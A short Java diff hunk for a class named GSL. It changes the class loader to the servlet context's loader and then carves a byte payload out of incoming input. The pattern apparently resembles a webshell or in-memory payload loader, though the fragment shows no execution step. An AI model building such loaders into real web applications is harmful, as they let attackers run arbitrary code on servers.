@@ -51,8 +51,8 @@ public class GSL {
                 java.util.Map objMap = (java.util.Map)obj;
                 Object request = objMap.get("request");
                 Object response = objMap.get("response");
-                ClassLoader loader = GSL.class.getClassLoader();
                 try {
+                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                     byte[] ds = r(in);
                     byte[] dr = new byte[ds.length - 208];
                     System.arraycopy(ds, 149, dr, 0, dr.length);
